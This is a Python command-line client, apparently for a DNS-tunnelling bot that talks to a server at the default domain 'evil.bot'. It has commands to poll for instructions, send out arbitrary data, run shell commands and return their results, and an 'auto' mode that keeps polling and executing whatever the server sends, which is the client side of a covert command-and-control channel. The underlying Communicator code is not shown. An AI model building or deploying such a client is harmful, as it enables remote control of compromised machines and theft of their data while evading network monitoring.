import click
from typing import Optional
from client_state import ClientState
from communicator import Communicator, AutoCommunicator

IS_LIVE = False


@click.group()
@click.option('--nameserver', type=str, default='127.0.0.1', show_default=True, help="IP-Address of the nameserver.")
@click.option('--domain', type=str, default='evil.bot', show_default=True, help="Domain name of the target server.")
@click.option('--lag', type=click.IntRange(min=0), default=0, help="Number of seconds between chained requests.")
@click.option('--id', 'client_id', type=int, help="Set the id of the client (otherwise a new id gets requested for every command).")
@click.option('--live', is_flag=True, help="Activate Live display of data (otherwise final response gets printed).")
@click.pass_context
def main(ctx, nameserver: str, domain: str, lag: int, client_id: Optional[int], live: bool):
    """
    DNS-Tunneling Client.
    """
    global IS_LIVE
    IS_LIVE = live
    ctx.obj = Communicator(client_state=ClientState(), domain=domain, name_server=nameserver, client_id=client_id,
                           request_lag_seconds=lag, live_output=live)


@main.command(name='id')
@click.pass_obj
def request_id_command(comm: Communicator):
    """
    Requests new Client ID.
    """
    client_id = comm.request_id()
    if not IS_LIVE:
        click.echo(client_id)


@main.command()
@click.option('--auto-respond', 'auto_respond', is_flag=True, help="Automatically respond to poll response.")
@click.pass_obj
def poll(comm: Communicator, auto_respond: bool):
    """
    Polls the next Command/Data from the server.

    If AUTO-RESPOND is set, the client automatically executes command, when he gets one.
    """
    response = comm.poll(auto_respond=auto_respond)
    if not IS_LIVE:
        click.echo(response)


# @main.command(name='continue')
# @click.pass_obj
# def continue_command(comm: Communicator):
#     pass

@main.command()
@click.option('--head', type=str, required=True, help="The header for the data (can be anything e.g. the filename).")
@click.option('--body', type=str, required=True, help="The data that should be send to the server.")
@click.pass_obj
def data(comm: Communicator, head: str, body: str):
    """
    Sends data to the target server.
    """
    response = comm.data(head=head, body=body.encode('utf-8').decode('unicode_escape'))
    if not IS_LIVE:
        click.echo(response)


@main.command()
@click.option('--webpage', type=str, required=True, help="The requested webpage.")
@click.pass_obj
def curl(comm: Communicator, webpage: str):
    """
    Requests a get requests for WEBPAGE from the target server.
    """
    response = comm.curl(webpage=webpage)
    if not IS_LIVE:
        click.echo(response)


@main.command()
@click.option('--command', type=str, required=True, help="The shell command that should be executed.")
@click.pass_obj
def shell(comm: Communicator, command: str):
    """
    Executes the shell command COMMAND and send the result to the target server.
    """
    response = comm.shell(command=command)
    if not IS_LIVE:
        click.echo(response)


@main.command()
@click.option('--poll', '--poll-seconds', 'poll_sec', type=click.IntRange(min=0), default=10, help="Number of seconds between each poll.")
@click.pass_obj
def auto(comm: Communicator, poll_sec: int):
    """
    Autonomously poll from and respond to the target server.

    Autonomously poll the target server every POLL seconds and respond accordingly.
    """
    AutoCommunicator(comm, poll_seconds=poll_sec)


if __name__ == '__main__':
    main()
